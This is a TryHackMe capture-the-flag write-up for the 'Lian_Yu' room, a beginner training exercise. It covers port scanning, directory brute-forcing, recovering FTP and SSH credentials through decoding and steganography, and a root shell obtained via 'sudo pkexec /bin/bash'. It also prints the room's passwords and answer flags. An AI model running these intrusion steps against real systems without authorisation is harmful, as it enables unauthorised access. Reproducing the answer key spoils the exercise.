# 🏹 TryHackMe — Lian_Yu CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Lian__Yu-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)

> A beginner-level CTF room on TryHackMe themed around the TV show **Arrow**.  
> The objective is to find all flags through enumeration, web exploitation, steganography, and privilege escalation.

---

## 📋 Table of Contents

- [Room Info](#room-info)
- [Tools Used](#tools-used)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — Web Enumeration](#step-2--web-enumeration)
- [Step 3 — Finding the Hidden Ticket](#step-3--finding-the-hidden-ticket)
- [Step 4 — Decoding the Token](#step-4--decoding-the-token)
- [Step 5 — FTP Access](#step-5--ftp-access)
- [Step 6 — File Analysis & Steganography](#step-6--file-analysis--steganography)
- [Step 7 — SSH Login & User Flag](#step-7--ssh-login--user-flag)
- [Step 8 — Privilege Escalation & Root Flag](#step-8--privilege-escalation--root-flag)
- [Flags Summary](#flags-summary)
- [Lessons Learned](#lessons-learned)

---

## 🗺️ Room Info

| Field      | Details                                   |
|------------|-------------------------------------------|
| Room Name  | Lian_Yu                                   |
| Platform   | TryHackMe                                 |
| Difficulty | Easy                                      |
| URL        | https://tryhackme.com/room/lianyu         |
| Theme      | Arrow (TV Show)                           |
| Target IP  | 10.49.159.122                             |

---

## 🛠️ Tools Used

| Tool       | Purpose                          |
|------------|----------------------------------|
| `nmap`     | Port & service scanning          |
| `gobuster` | Web directory enumeration        |
| `ftp`      | Download files from FTP server   |
| `file`     | Identify file types              |
| `xxd`      | Hex inspection of files          |
| `binwalk`  | Binary/file analysis             |
| `steghide` | Extract hidden steganography data|
| `base58`   | Decode Base58 encoded token      |
| `ssh`      | Remote shell access              |
| `sudo`     | Privilege escalation             |

---

## Step 1 — Nmap Scan

```bash
nmap -sC -sV -T4 10.49.159.122
```

**Screenshot:**

<img width="722" height="552" alt="1" src="https://github.com/user-attachments/assets/f4a43818-5a65-4e34-9e79-5eac38a5dbfa" />


**Open Ports:**

| Port | State | Service | Version                        |
|------|-------|---------|--------------------------------|
| 21   | open  | FTP     | vsftpd 3.0.2                   |
| 22   | open  | SSH     | OpenSSH 6.7p1 Debian 5+deb8u8  |
| 80   | open  | HTTP    | Apache httpd                   |
| 111  | open  | rpcbind | 2-4 (RPC #100000)              |

**Key observation:** HTTP title returns **"Purgatory"** — an Arrow TV show reference.

---

## Step 2 — Web Enumeration

### Visiting the Homepage

Navigating to `http://10.49.159.122` showed an **ARROWVERSE** themed page with a story about Oliver Queen.

<img width="932" height="822" alt="2" src="https://github.com/user-attachments/assets/c2ba3199-25ce-4760-b869-eea2f9b9a4ef" />


### Directory Bruteforce

```bash
gobuster dir -u http://10.49.159.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="723" height="523" alt="3" src="https://github.com/user-attachments/assets/864c925b-c1c1-4a70-92b0-551abf8f61eb" />


**Found:** `/island` (Status: 301)

### Visiting /island

Navigating to `http://10.49.159.122/island` showed a page with the codeword hidden.

<img width="956" height="282" alt="4" src="https://github.com/user-attachments/assets/d5122bf9-dd6a-4733-a25e-66919e4d28ae" />


### Viewing Page Source

Checking the page source (`Ctrl+U`) revealed the **codeword hidden in white-coloured text** on line 20:

```html
<h2 style="color:white"> vigilante</h2>
```

Also found an HTML comment: `<!-- go!go!go! -->`

<img width="950" height="492" alt="5" src="https://github.com/user-attachments/assets/eee1328f-b590-4ef7-9e4c-2198b6cd0564" />


> **Codeword (FTP Username): `vigilante`**

---

## Step 3 — Finding the Hidden Ticket

Running Gobuster again on `/island` with `.ticket` extension:

```bash
gobuster dir -u http://10.49.159.122/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

<img width="715" height="322" alt="6" src="https://github.com/user-attachments/assets/af47589d-a52b-429f-8021-ce05acc090a8" />


**Found:** `/island/2100` (Status: 301)

### Visiting /island/2100

The page showed an embedded YouTube video titled **"How Oliver Queen finds his way to Lian_Yu?"**

<img width="956" height="672" alt="7" src="https://github.com/user-attachments/assets/c14a760d-0c58-4f45-9f24-80c8e14a99d8" />


Checking page source revealed a hint: `<!-- you can avail your .ticket here but how? -->`

<img width="956" height="376" alt="8" src="https://github.com/user-attachments/assets/46b8b465-33a0-467c-8307-db7a9934f4a7" />


### Accessing the Ticket File

Navigating directly to `http://10.49.159.122/island/2100/green_arrow.ticket`:

<img width="956" height="192" alt="9" src="https://github.com/user-attachments/assets/bc8fa2b9-abb4-4a0f-8685-db884638ffde" />


**Token found:** `RTy8yhBQdscX`

> **Ticket filename: `green_arrow.ticket`**

---

## Step 4 — Decoding the Token

The token `RTy8yhBQdscX` is **Base58 encoded**. Decoded using:

```bash
echo "RTy8yhBQdscX" | base58 -d
```

<img width="358" height="62" alt="10" src="https://github.com/user-attachments/assets/01771b8c-ae4b-4991-b0c6-47633647ddbd" />


> **FTP Password: `!#th3h00d`**

---

## Step 5 — FTP Access

Logged into FTP with the discovered credentials:

```bash
ftp 10.49.159.122
# Username: vigilante
# Password: !#th3h00d
```

<img width="636" height="422" alt="11" src="https://github.com/user-attachments/assets/080b2811-6c88-45db-b9cd-c012b18ca72f" />


**Files found:**
- `Leave_me_alone.png` (511720 bytes)
- `Queen's_Gambit.png` (549924 bytes)
- `aa.jpg` (191026 bytes)

Downloaded all files:

```bash
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
```

<img width="721" height="352" alt="12" src="https://github.com/user-attachments/assets/3e366a4f-8df6-4fb0-8fd7-6e0d26b146d9" />


---

## Step 6 — File Analysis & Steganography

### Checking File Types

```bash
file Leave_me_alone.png
file Queen\'s_Gambit.png
file aa.jpg
binwalk Leave_me_alone.png
binwalk Queen\'s_Gambit.png
binwalk aa.jpg
```

<img width="795" height="627" alt="13" src="https://github.com/user-attachments/assets/95a0ec11-3f83-4d21-a2f9-752ce1039704" />


**Key finding:** `Leave_me_alone.png` showed as **"data"** instead of a PNG — its magic bytes were corrupted!

### Inspecting the Corrupted PNG

```bash
xxd Leave_me_alone.png | head -5
```

<img width="575" height="140" alt="14" src="https://github.com/user-attachments/assets/1c7ab78d-6992-4a8b-bb01-74fa8e346233" />

The file header was `58 45 0a 0d` instead of the correct PNG magic bytes `89 50 4E 47 0D 0A 1A 0A`.

### Fixing the Magic Bytes

```bash
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=Leave_me_alone.png bs=1 seek=0 conv=notrunc
file Leave_me_alone.png
```

<img width="736" height="167" alt="15" src="https://github.com/user-attachments/assets/382f8486-eb71-4d89-ba7b-3a3c19c5ed2b" />


File now correctly identified as: `PNG image data, 845 x 475, 8-bit/color RGBA`

### Opening the Image

Opening `Leave_me_alone.png` revealed the **steghide passphrase** written in the image:

<img width="955" height="873" alt="16" src="https://github.com/user-attachments/assets/fcea479e-7be5-4d3b-a90f-9055f71b3977" />


> **Steghide Passphrase: `password`**

### Extracting Hidden Data

```bash
steghide extract -sf aa.jpg -p "password"
```

<img width="307" height="82" alt="17" src="https://github.com/user-attachments/assets/6822bbc7-d9b1-43dd-9b12-9887965d0f64" />


**Extracted:** `ss.zip`

### Unzipping

```bash
unzip ss.zip
```

<img width="282" height="96" alt="18" src="https://github.com/user-attachments/assets/7316ef4d-d4de-4426-813b-f0e8c54a9114" />


**Files extracted:** `passwd.txt` and `shado`

### Reading the Files

```bash
cat passwd.txt
cat shado
```

<img width="632" height="355" alt="19" src="https://github.com/user-attachments/assets/93f4f956-d631-449e-a36a-22607845d11e" />


- `passwd.txt` — A decoy story about Oliver Queen on the island
- `shado` — Contains the SSH password: **`M3tahuman`**

> **SSH Password File: `shado`**  
> **SSH Password: `M3tahuman`**

---

## Step 7 — SSH Login & User Flag

```bash
ssh slade@10.49.159.122
# Password: M3tahuman
```

Accepted the host fingerprint and logged in successfully with the **WELCOME2 LIAN_YU** banner:

<img width="712" height="527" alt="20" src="https://github.com/user-attachments/assets/aef7f148-107c-4b46-9500-7947d4a2e731" />


### Getting the User Flag

```bash
ls
cat user.txt
```

<img width="382" height="127" alt="21" src="https://github.com/user-attachments/assets/25519d1b-0bf1-4f9e-882d-cbbb8b43953b" />


> **User Flag: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`**  
> *— Felicity Smoak*

---

## Step 8 — Privilege Escalation & Root Flag

### Checking Sudo Permissions

```bash
sudo -l
```


**Output:**
```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

### Escalating to Root

`pkexec` can be used to execute commands as root. Used it to spawn a bash shell:

```bash
sudo pkexec /bin/bash
```

Got a root shell immediately! Then read the root flag:

```bash
cat /root/root.txt
```

<img width="742" height="406" alt="22" src="https://github.com/user-attachments/assets/8f170aa5-92b7-4276-abb7-488d0fce905d" />


> **Root Flag: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`**  
> *— DEATHSTROKE*

---

## 🚩 Flags Summary

| Question                          | Answer                                                                                                        |
|-----------------------------------|---------------------------------------------------------------------------------------------------------------|
| Web directory (number)            | `2100`                                                                                                        |
| Ticket filename                   | `green_arrow.ticket`                                                                                          |
| FTP Password                      | `!#th3h00d`                                                                                                   |
| File with SSH password            | `shado`                                                                                                       |
| User Flag (`user.txt`)            | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`                                                                  |
| Root Flag (`root.txt`)            | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`                |

---

## 📚 Lessons Learned

1. **Hidden text in HTML** — Always view page source; codewords can be hidden using `color:white` CSS tricks
2. **File magic bytes** — A file's extension doesn't define its type; always use `file` and `xxd` to verify
3. **Steganography** — Images can contain hidden data; `steghide` with the right passphrase reveals it
4. **Base58 encoding** — Common CTF encoding; looks like a random alphanumeric string
5. **sudo -l is your friend** — Always check sudo permissions first for privilege escalation
6. **pkexec privesc** — If a user can run `pkexec` as root, it can be used to spawn a root shell

---

*Writeup by: izzul harith*  
*Date: June 2026*  
*Platform: TryHackMe | Room: Lian_Yu | Difficulty: Easy*
